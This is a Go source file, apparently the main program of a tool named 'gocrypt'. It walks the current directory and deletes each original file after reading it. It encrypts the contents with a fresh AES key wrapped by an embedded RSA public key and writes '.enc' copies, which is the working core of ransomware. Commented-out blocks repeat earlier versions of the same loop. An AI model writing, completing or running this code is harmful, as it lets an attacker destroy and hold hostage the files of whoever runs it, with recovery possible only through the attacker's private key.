package main

import (
	_ "embed"
	"log"
	"os"

	"github.com/Devil666face/gocrypt/internal/async"
	"github.com/Devil666face/gocrypt/internal/io"
	"github.com/Devil666face/gocrypt/internal/sync"
	"github.com/Devil666face/gocrypt/pkg/lib"
)

//go:embed id_rsa.pub
var PubKey string

func Encrytp(f lib.File, errchan chan error) {
	in, err := io.ReadFile(f.Path)
	if err != nil {
		errchan <- err
		return
	}
	if err := os.Remove(f.Path); err != nil {
		errchan <- err
		return
	}
	s := sync.New(in)
	chip, err := s.Encrypt()
	if err != nil {
		errchan <- err
		return
	}
	a := async.New(s.AesKey, func(a *async.Async) {
		a.PubKey = async.Key(PubKey)
	})
	chipAesKey, err := a.EncryptBase64()
	if err != nil {
		errchan <- err
		return
	}
	chip = append(chip, chipAesKey...)
	if err := io.WriteFile(chip, f.Path+".enc"); err != nil {
		errchan <- err
		return
	}
	log.Print(f.Path, " encrypted")
	errchan <- nil
	return
}

func main() {
	files, err := lib.Walk(".")
	if err != nil {
		log.Fatal(err)
	}

	result := make(chan error, len(files))
	for _, f := range files {
		go Encrytp(f, result)
	}

	select {
	case err := <-result:
		if err != nil {
			log.Print(err)
		}
	}
	close(result)

	// tasks := []func() error{}

	// results := make(chan error, len(files))

	// for _, f := range files {
	// 	f = f
	// 	tasks = append(tasks, func() error {
	// 		return Encrytp(f)
	// 	})
	// }

	// for _, task := range tasks {
	// 	results <- task()
	// }

	// var wg s.WaitGroup
	// for i := 0; i < 4; i++ {
	// 	wg.Add(1)
	// 	go func() {
	// 		for res := range results {
	// 			if res != nil {
	// 				log.Print(res)
	// 			}
	// 		}
	// 		wg.Done()
	// 	}()
	// }

	// close(results)
	// wg.Wait()

	// for _, f := range files {
	// in, err := io.ReadFile(f.Path)
	// if err != nil {
	// 	log.Print(err)
	// 	continue
	// }
	// if err := os.Remove(f.Path); err != nil {
	// 	log.Print(err)
	// 	continue
	// }
	// s := sync.New(in)
	// chip, err := s.Encrypt()
	// if err != nil {
	// 	log.Print(err)
	// 	continue
	// }
	// a := async.New(s.AesKey, func(a *async.Async) {
	// 	a.PubKey = async.Key(PubKey)
	// })
	// chipAesKey, err := a.EncryptBase64()
	// if err != nil {
	// 	log.Print(err)
	// 	continue
	// }
	// chip = append(chip, chipAesKey...)
	// if err := io.WriteFile(chip, f.Path+".enc"); err != nil {
	// 	log.Print(err)
	// 	continue
	// }
	// log.Print(f.Path, " encrypted")
	// }

	// i := crypt.NewInput()
	// in, err := io.ReadFile(i.InPath)
	// if err != nil {
	// 	log.Fatal(err)
	// }
	// s := sync.New(in)
	// chip, err := s.Encrypt()
	// if err != nil {
	// 	log.Fatal(err)
	// }
	// a := async.New(s.AesKey, func(a *async.Async) {
	// 	a.PubKey = async.Key(PubKey)
	// })
	// chipAesKey, err := a.EncryptBase64()
	// if err != nil {
	// 	log.Fatal(err)
	// }
	// chip = append(chip, chipAesKey...)
	// if err := io.WriteFile(chip, i.OutPath); err != nil {
	// 	log.Fatal(err)
	// }
	// os.Exit(0)
}
